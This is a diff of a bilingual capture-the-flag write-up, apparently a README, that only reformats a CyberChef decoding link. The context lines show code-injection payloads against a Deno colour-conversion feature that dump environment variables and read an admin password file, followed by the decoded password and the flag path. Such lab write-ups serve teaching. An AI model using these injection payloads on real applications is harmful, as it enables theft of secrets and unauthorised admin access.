@@ -16,7 +16,7 @@
 -> La fonctionnalité vulnérable est celle qui transforme un nom de couleur en code hexadécimal
 -> Le premier payload `green;Deno.inspect(Deno.env.toObject())` permet de récupérer le nom du fichier contenant le mot de passe de l'admin
 -> Le second payload `green;Deno.inspect(Deno.readFileSync("admin_password_954d3f72c784179a.txt"))` permet de récupérer le mot de passe de l'admin encodé
--> Pour le décoder : https://gchq.github.io/CyberChef/#recipe=From_Decimal('Comma',false)&input=ODcsODAsNTUsNzIsNDksNTMsNDksNTMsNzcsODksNTIsNTMsNTUsMTE0LDQ4LDUyLDgwLDgwLDgwLDUyLDUzLDUzLDg3LDQ4LDExNCw2OCw1NCw1Miw1MCw1NSw0OSw1MCw1Nyw1Miw1NCw0OCw1Nyw1Miw1NSw1Niw1MQ
+-> Pour le décoder : [ici](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Comma', false)&input=ODcsODAsNTUsNzIsNDksNTMsNDksNTMsNzcsODksNTIsNTMsNTUsMTE0LDQ4LDUyLDgwLDgwLDUyLDUzLDg3LDQ4LDExNCw2OCw1NCw1Miw1MCw1NSw0OSw1MCw1Nyw1Miw1NCw0OCw1Nyw1Miw1NSw1Niw1MQ)
 ->  Mot de passe de l'admin : `WP7H1515MY457r04PPP455W0rD642712946094783`
 -> On peut ensuite se connecter à l'interface admin via : `http://<host>/admin`
 -> Et accéder à la page contenant le flag : `http://<host>/d1c30991da3141cc96d15f80123c1424`
@@ -38,7 +38,7 @@
 -> The vulnerable functionality is the one that transforms a colour name into a hexadecimal code
 -> The first payload `green;Deno.inspect(Deno.env.toObject())` retrieves the name of the file containing the admin password
 -> The second payload `green;Deno.inspect(Deno.readFileSync("admin_password_954d3f72c784179a.txt"))` retrieves the encoded admin password
--> To decode it: https://gchq.github. io/CyberChef/#recipe=From_Decimal('Comma', false)&input=ODcsODAsNTUsNzIsNDksNTMsNDksNTMsNzcsODksNTIsNTMsNTUsMTE0LDQ4LDUyLDgwLDgwLDUyLDUzLDg3LDQ4LDExNCw2OCw1NCw1Miw1MCw1NSw0OSw1MCw1Nyw1Miw1NCw0OCw1Nyw1Miw1NSw1Niw1MQ
+-> To decode it: [here](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Comma', false)&input=ODcsODAsNTUsNzIsNDksNTMsNDksNTMsNzcsODksNTIsNTMsNTUsMTE0LDQ4LDUyLDgwLDgwLDUyLDUzLDg3LDQ4LDExNCw2OCw1NCw1Miw1MCw1NSw0OSw1MCw1Nyw1Miw1NCw0OCw1Nyw1Miw1NSw1Niw1MQ)
 -> Admin password: `WP7H1515MY457r04PPP455W0rD642712946094783`
 -> Then you can connect to the admin interface via: `http://<host>/admin`
 -> And access the page containing the flag: `http://<host>/d1c30991da3141cc96d15f80123c1424`
